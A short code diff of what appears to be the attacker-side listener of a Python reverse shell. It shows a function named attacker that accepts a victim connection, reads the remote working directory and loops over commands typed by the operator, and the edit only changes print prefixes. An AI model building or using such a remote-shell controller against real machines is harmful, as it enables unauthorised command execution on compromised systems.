@@ -14,10 +14,10 @@ def attacker(listen_ip, listen_port):
     print(f"Listening as {ATTACKER_HOST} : {ATTACKER_PORT} ...")
 
     client_socket, client_address = s.accept()
-    print(f"{client_address[0]} : {client_address[1]} Connected!")
+    print(f"[*] {client_address[0]} : {client_address[1]} Connected!")
 
     cwd = client_socket.recv(BUFFER_SIZE).decode("utf-8")
-    print("[+] Current working directory:", cwd)
+    print("[*] Current working directory:", cwd)
 
     while True:
         command = input(f"{cwd}> ")
